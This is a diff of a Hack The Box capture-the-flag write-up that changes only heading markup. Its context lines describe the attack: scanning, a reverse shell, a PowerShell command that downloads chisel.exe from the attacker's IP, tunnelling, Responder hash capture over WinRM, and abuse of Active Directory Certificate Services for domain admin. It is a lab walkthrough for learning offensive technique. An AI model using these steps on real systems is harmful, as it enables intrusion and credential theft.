@@ -9,14 +9,14 @@ tags: HTB
 
 <img src="https://i.ibb.co/9G93v2k/2022-01-22-19-55-34.png" alt="2022-01-22-19-55-34" border="0">
 
-<h1>Summary</h1> 
+# Summary 
 - RCE in the Web application
 - Pivoting 
 - Network analysis
 - Custom Exploitation 
 - Domain Admin by Abusing Certifcate service 
 
-<h1>Nmap</h1> 
+## Scanning  
 ```
 nmap -p- -sV -sC -v -oA enum --min-rate 4500 --max-rtt-timeout 1500ms --open
 10.10.11.102
@@ -103,7 +103,7 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 13:04:05.403998 IP 10.10.17.76 > www.windcorp.htb: ICMP echo reply, id 1000, seq 2768, length 40 
  ```
  
- <h1>Foothold</h1>
+ ### Foothold
  
  Lets get a reverse shell ! 
  
@@ -161,7 +161,7 @@ d-r---         4/9/2021  10:36 PM                Public
 
  <img src="https://c.tenor.com/m6l7wY1JeDMAAAAd/koksal-sad.gif" alt="sad" border="0">
  
- <h1>Enumeration</h1>
+ #### Enumeration
  
  Lets see what the Administrator have on desktop. 
  
@@ -211,7 +211,7 @@ There is another subdomain, I added it to /etc/hosts but i couldn't reach it
 
 I need to establish a tunnel to port forward the machines ports to see be able to open the internal web application.
 
-<h1>Port forwarding</h1>
+###### Port forwarding
 
 If you are struggling downloading chisel to the machine you can use this 
 command : "(new-object System.Net.WebClient).DownloadFile('http://10.10.17.76:8888/chisel.exe','C:\users\Administrator\Desktop\chisel.exe')".
@@ -247,7 +247,7 @@ The web application is getting the programs from internal ip, lets see what is h
 
 <img src="https://i.ibb.co/XJbZ9YY/Pasted-image-20220128164647.png" alt="Pasted-image-20220128164647" border="0">
 
-<h1>Lateral Movement</h1> 
+###### Lateral Movement
 
 Lets analyze the request by changing the client to our ip and setup a listener using **TCPDUMP** to see what is happening.
 
@@ -276,7 +276,7 @@ That didn't work for me from the 1st time, don't give up on it, keep trying.
 
 From that logs i understood that the web application trying to authenticate from WinRM to get the file.
 
-<h1>Escaping the docker</h1>
+###### Escaping the docker
 
 I will start the respinder to catch the hash of the user that trying to authenticate against WinRM.
 
@@ -330,7 +330,7 @@ Stopped: Sat Oct 30 21:17:37 2021
 ------------SNIP------------
 ```
 
-<h1>User</h1>
+###### User
 
 Lets enumerate SMB.
 
@@ -444,7 +444,7 @@ PS C:\users\diegocruz\Desktop> type user.txt
 <img src="https://c.tenor.com/uDe2SrA9gSIAAAAd/dance-%D8%B1%D9%82%D8%B5.gif" alt=OW border="0">
 
 
-<h1>ROOT</h1>
+###### ROOT
 If you noticed CertEnroll share when we used SMBclient, that folder used by Active Directory Certificate Services for certificate enrollment.
 
 now lets use certutil -template to see what template we have permission to issue.
